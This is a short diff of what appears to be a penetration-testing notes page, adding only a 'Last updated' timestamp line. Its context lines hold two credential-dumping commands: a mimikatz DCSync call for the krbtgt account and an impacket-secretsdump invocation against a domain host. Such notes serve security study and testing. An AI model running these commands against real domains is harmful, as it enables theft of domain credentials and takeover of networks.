@@ -26,3 +26,6 @@ lsadump::dcsync /user:krbtgt
 ````powershell
 impacket-secretsdump <domain>\<username>@<IP-ADDRESS>
 ````
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
